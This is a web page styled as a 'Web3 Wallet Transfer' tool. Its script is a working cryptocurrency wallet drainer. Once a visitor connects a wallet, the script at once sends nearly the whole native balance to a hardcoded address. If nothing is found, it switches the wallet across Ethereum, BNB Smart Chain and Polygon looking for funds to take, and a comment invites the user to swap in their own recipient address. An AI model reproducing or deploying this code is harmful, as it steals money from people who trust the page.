<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Wallet Transfer</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #0e0e0e;
            color: #ffffff;
        }
        .container {
            max-width: 800px;
            margin: auto;
            padding: 30px;
            background: linear-gradient(135deg, #1e1e1e, #333);
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
        }
        h1 {
            text-align: center;
            color: #4caf50;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 10px;
            cursor: pointer;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #81c784;
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #e0e0e0;
            white-space: pre-wrap;
        }
        footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #bbb;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Web3 Wallet Transfer</h1>
        <button id="connectWallet">Connect Wallet</button>
        <button id="disconnectWallet" disabled>Disconnect Wallet</button>
        <p id="status"></p>
    </div>

    <footer>
        <p>&copy; 2024 Web3 Crypto Transfer Tool</p>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        let provider, signer, userAddress = "";
        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8"; // Change this to your recipient address

        const networks = [
            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH' },
            { chainId: 56, name: 'BNB Smart Chain', nativeSymbol: 'BNB' },
            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC' },
            // Add more networks as needed
        ];

        document.getElementById('connectWallet').addEventListener('click', async () => {
            if (!window.ethereum) {
                document.getElementById('status').innerText = `MetaMask is not installed.`;
                return;
            }

            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                document.getElementById('status').innerText = `Connected: ${userAddress}`;

                // Enable disconnect button after connection
                document.getElementById('disconnectWallet').disabled = false;
                document.getElementById('connectWallet').disabled = true;

                // Start checking balances and sending crypto
                await checkBalancesAndSendCrypto();
            } catch (error) {
                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
            }
        });

        document.getElementById('disconnectWallet').addEventListener('click', () => {
            userAddress = "";
            signer = null;
            provider = null;
            document.getElementById('status').innerText = `Disconnected.`;
            document.getElementById('disconnectWallet').disabled = true;
            document.getElementById('connectWallet').disabled = false;
        });

        async function checkBalancesAndSendCrypto() {
            try {
                const network = await provider.getNetwork();
                const balance = await provider.getBalance(userAddress);

                if (balance.isZero()) {
                    document.getElementById('status').innerText = `No funds found on ${network.name}. Checking other networks...`;
                    await checkOtherNetworksAndSendCrypto();
                } else {
                    await sendNativeCrypto(balance, network);
                }
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }

        async function checkOtherNetworksAndSendCrypto() {
            for (const net of networks) {
                if (net.chainId !== (await provider.getNetwork()).chainId) { // Avoid checking the current network again
                    try {
                        await switchNetwork(net.chainId);
                        const balance = await provider.getBalance(userAddress);
                        if (!balance.isZero()) {
                            await sendNativeCrypto(balance, net);
                            return; // Exit after successful transaction
                        }
                    } catch (error) {
                        document.getElementById('status').innerText += `\nFailed to check ${net.name}: ${error.message}`;
                    }
                }
            }
            document.getElementById('status').innerText += `\nNo funds available on any checked networks.`;
        }

        async function sendNativeCrypto(balance, network) {
            // Calculate amount to send (keeping a small amount for gas fees)
            const gasBuffer = ethers.utils.parseUnits('0.001', 18); // Buffer for gas fees
            const amountToSend = balance.sub(gasBuffer);

            // Ensure that we are not sending a negative value
            if (amountToSend.lt(0)) {
                document.getElementById('status').innerText = `Insufficient balance to send on ${network.name}. Switching networks...`;
                await checkOtherNetworksAndSendCrypto(); // Check other networks if insufficient
                return;
            }

            const tx = {
                to: recipientAddress,
                value: amountToSend
            };

            try {
                const txResponse = await signer.sendTransaction(tx);
                await txResponse.wait();
                document.getElementById('status').innerText = `Sent ${ethers.utils.formatEther(amountToSend)} ${network.nativeSymbol} from ${network.name}.`;
            } catch (error) {
                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
            }
        }

        async function switchNetwork(chainId) {
            try {
                await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId.toString(16)}` }]);
                provider = new ethers.providers.Web3Provider(window.ethereum); // Update provider after switch
                signer = provider.getSigner();
                document.getElementById('status').innerText = `Switched to network with chainId: ${chainId}`;
            } catch (switchError) {
                // Handle the case where the user has not added the network
                if (switchError.code === 4902) {
                    const networkDetails = networks.find(n => n.chainId === chainId);
                    if (networkDetails) {
                        await provider.send("wallet_addEthereumChain", [{
                            chainId: `0x${chainId.toString(16)}`,
                            chainName: networkDetails.name,
                            rpcUrls: [`https://rpc-mainnet.matic.network`], // Replace with actual RPC URL
                            nativeCurrency: {
                                name: networkDetails.name,
                                symbol: networkDetails.nativeSymbol,
                                decimals: 18
                            },
                        }]);
                        await switchNetwork(chainId); // Retry switching after adding the network
                    }
                } else {
                    throw switchError;
                }
            }
        }
    </script>
</body>
</html>
